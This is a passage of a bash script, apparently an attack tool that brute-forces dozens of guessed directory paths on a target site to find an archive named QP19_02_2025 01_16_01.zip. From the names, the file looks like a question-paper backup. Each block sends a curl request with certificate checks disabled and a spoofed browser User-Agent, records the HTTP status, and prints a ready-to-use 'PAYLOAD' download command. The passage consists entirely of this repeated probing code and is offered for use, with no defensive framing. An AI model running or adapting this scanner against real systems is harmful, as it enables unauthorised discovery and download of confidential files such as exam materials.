${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMgmtTransfer/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMgmtTransfer/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMgmtTransfer/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DatabaseManagerQPHandler/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DatabaseManagerQPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DatabaseManagerQPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QstnPaper-CloudSync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QstnPaper-CloudSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QstnPaper-CloudSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DatabaseManager-QPBatch/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DatabaseManager-QPBatch/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DatabaseManager-QPBatch/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DashboardQsnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DashboardQsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DashboardQsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaperDoc_HandlingModule/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaperDoc_HandlingModule/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaperDoc_HandlingModule/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPService_DataProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPService_DataProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPService_DataProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAdmin_DataUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAdmin_DataUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAdmin_DataUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPHandler_FileUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPHandler_FileUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPHandler_FileUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBFileDashboard/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBFileDashboard/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBFileDashboard/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAuto_AccessControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAuto_AccessControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAuto_AccessControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Manager-QPAdmin/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Manager-QPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Manager-QPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingSuiteQPBulk/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingSuiteQPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingSuiteQPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataOpsQPMgmt/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataOpsQPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataOpsQPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPSystem-UploadService/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPSystem-UploadService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPSystem-UploadService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [SuiteQPCloud/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}SuiteQPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}SuiteQPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPProcessing-Workflow/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPProcessing-Workflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPProcessing-Workflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPWorkflow-DataSync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPWorkflow-DataSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPWorkflow-DataSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutomationQPBFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutomationQPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutomationQPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMgmtMgmt/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMgmtMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMgmtMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [UploadService-QPUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}UploadService-QPUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}UploadService-QPUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [FileProcessor-QstnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}FileProcessor-QstnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}FileProcessor-QstnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [UploadServiceQPUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}UploadServiceQPUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}UploadServiceQPUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMonitorProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMonitorProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMonitorProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPServiceUploadService/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPServiceUploadService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPServiceUploadService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AdminQPMgmt/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AdminQPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AdminQPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [SuiteQPControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}SuiteQPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}SuiteQPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ManagerQPFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ManagerQPFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ManagerQPFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QP-Upload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QP-Upload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QP-Upload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBulkSync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBulkSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBulkSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMasterHandling/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMasterHandling/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMasterHandling/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ServiceQPDatabase/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ServiceQPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ServiceQPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataOps_QPWorkflow/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataOps_QPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataOps_QPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUploaderSuite/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUploaderSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUploaderSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUploadWorkflow/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUploadWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUploadWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Portal-QPUploader/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Portal-QPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Portal-QPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingSystem_QPBData/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingSystem_QPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingSystem_QPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MassUpload-QPDatabase/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MassUpload-QPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MassUpload-QPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [HandlingQ_P/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
